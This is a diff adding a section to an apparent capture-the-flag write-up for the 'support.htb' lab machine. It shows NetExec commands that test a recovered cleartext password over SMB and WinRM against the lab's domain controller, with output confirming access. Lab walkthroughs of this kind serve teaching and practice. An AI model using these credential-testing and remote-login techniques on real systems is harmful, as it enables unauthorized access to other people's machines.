@@ -192,5 +192,18 @@ I used mousepad and used ctrl+f to search through all the users in the list til 
 # Compromising the `support` user
 
 ```python
-
+nxc smb dc.support.htb -u support -p 'Ironside47pleasure40Watchful'                                         
+SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.230.181  445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
 ```
+
+This user is now compromised!
+
+```python
+nxc winrm dc.support.htb -u support -p 'Ironside47pleasure40Watchful'
+WINRM       10.129.230.181  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) 
+WINRM       10.129.230.181  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
+```
+
+This user also has access over WINRM
+
